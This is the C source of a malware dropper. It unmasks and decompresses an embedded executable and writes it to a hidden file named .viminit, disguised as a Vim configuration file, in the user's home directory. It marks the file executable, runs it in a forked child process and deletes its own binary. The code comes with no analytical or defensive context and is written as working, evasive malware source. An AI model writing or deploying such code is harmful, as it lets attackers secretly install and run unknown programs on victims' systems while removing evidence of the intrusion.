#include <stdio.h>
#include "payload.h"
#include <stdlib.h>
#include <sys/stat.h>
#include <zlib.h>

#define BUFSIZE 1024
#define PERM_755 (S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH)

char hiddenPath[BUFSIZE];
char const* hiddenName = ".viminit";

// dump to local file with x bit
int dumpToFile(unsigned char const* mem, size_t size){
	FILE* stream = NULL;
	sprintf(hiddenPath, "%s/%s", getenv("HOME"), hiddenName);
	if ((stream=fopen(hiddenPath, "w")) == NULL){
		return 0;
	}
	if (fwrite(mem, 1, size, stream) != size){
		return 0;
	}
	if (chmod(hiddenPath, PERM_755) == -1){
		return 0;
	}
	fclose(stream);
	return 1;
}

int main(int argc, char const** argv){
	unsigned char* executable = NULL;
	unsigned long int size = originalSize;
	char delCmd[BUFSIZE];

	payload[0] ^= 0x78;
	payload[1] ^= 0x9c;

	if ((executable=malloc(originalSize)) == NULL){
		perror("In malloc");
		return 1;
	}
	if (uncompress(executable, &size, payload, payloadSize) != Z_OK){
		printf("ERROR: cannot dump the embedded executable\n");
		return 1;
	}
	if (*(unsigned int*)executable != 0x464c457F){
		printf("ERROR: corrupted executable");
		return 1;
	}
	if (!dumpToFile(executable, size)){
		printf("ERROR: cannot dump to local file\n");
		return 1;
	}
	switch(fork()){
		case -1:
			perror("in fork");
			return 1;
		case 0:
			execl(hiddenPath, hiddenName, (char const*)NULL);
			break;
		default:
			// delete itself
			sprintf(delCmd, "rm %s", argv[0]);
			system(delCmd);
	}
	return 0;
}
